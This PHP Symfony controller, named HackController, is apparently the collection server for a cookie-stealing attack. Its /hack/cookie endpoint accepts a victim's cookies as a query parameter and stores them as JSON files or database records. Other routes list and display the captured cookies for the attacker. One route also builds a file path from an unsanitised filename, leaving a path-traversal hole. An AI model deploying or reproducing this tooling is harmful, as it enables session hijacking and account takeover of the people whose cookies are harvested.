<?php

namespace App\Controller;

use App\Entity\CookieRecord;
use App\Repository\CookieRecordRepository;
use DateTimeImmutable;
use DateTimeZone;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;

class HackController extends AbstractController
{
    CONST STORAGE_PATH = "../var/storage/";
    private CookieRecordRepository $cookieRecordRepository;

    /**
     * @param CookieRecordRepository $cookieRecordRepository
     */
    public function __construct(CookieRecordRepository $cookieRecordRepository)
    {
        $this->cookieRecordRepository = $cookieRecordRepository;
    }

    #[Route('/hack', name: 'app_hack')]
    public function index(): Response
    {
        $cookieFileList = scandir(self::STORAGE_PATH);
        array_splice($cookieFileList,0,2);
        $cookieFiles = [];
        foreach($cookieFileList as $c){
            $cookieFiles[] = [
                "createdAt"=>filectime(self::STORAGE_PATH.$c),
                //"name"=>$c
                "name"=>pathinfo(self::STORAGE_PATH.$c)["filename"]
            ];
        }
        return $this->render('hack/index.html.twig', [
            'controller_name' => 'HackController',
            'storedCookies'=>$this->cookieRecordRepository->findAll(),
            "cookieFiles"=>$cookieFiles
        ]);
    }

    #[Route('/hack/cookies/files/{filename}', name: 'app_hack_cookie_file_content')]
    public function showCookieFileContent(string $filename): Response
    {
        $content = json_decode(file_get_contents(self::STORAGE_PATH."$filename.json"),true);
        $createdAt = filectime(self::STORAGE_PATH."$filename.json");
        return $this->render('hack/show-cookie-file-content.html.twig', [
            "content"=>$content,
            "createdAt"=>$createdAt,
            "filename"=>$filename
        ]);
    }

    #[Route('/hack/cookies/records/{id}', name: 'app_hack_cookie_record')]
    public function showCookieRecord(CookieRecord $record): Response
    {
        return $this->render('hack/show-cookie-record.html.twig', ["record"=>$record]);
    }


    #[Route('/hack/cookie', name: 'app_hack_cookies')]
    public function grabCookies(Request $request): Response
    {

        $message = "No cookie for me ... ok that's was just a test ...";
        if($request->query->get('cookie') && $request->query->get('output')){

            $result = match($request->query->get('output')){
                "text"=>$this->createTextFile($request->query->get('cookie')),
                "store"=>$this->createRecord($request->query->get('cookie'))
            };

            $message = "Thank's for your cookies, yummy !";

        }

        return $this->render('hack/compromised.html.twig', [
            "message"=>$message
        ]);
    }

    private function formatCookie(string $cookie): array
    {
        $cookieArr = explode("; ",$cookie);
        $cookieFinal = [];

        foreach($cookieArr as $item){
            $itemArr = explode("=",$item);
            $cookieFinal[$itemArr[0]] = $itemArr[1];
        }

        return $cookieFinal;
    }

    private function createTextFile(string $cookie): bool
    {
        $timestamp = (new DateTimeImmutable('now',new DateTimeZone('Europe/Paris')))->getTimestamp();
        file_put_contents(self::STORAGE_PATH."cookies-$timestamp.json", json_encode($this->formatCookie($cookie)));
        return true;
    }

    private function createRecord(string $cookie): bool
    {
        $record = new CookieRecord($this->formatCookie($cookie));

        $this->cookieRecordRepository->add($record,true);
        return true;
    }

}
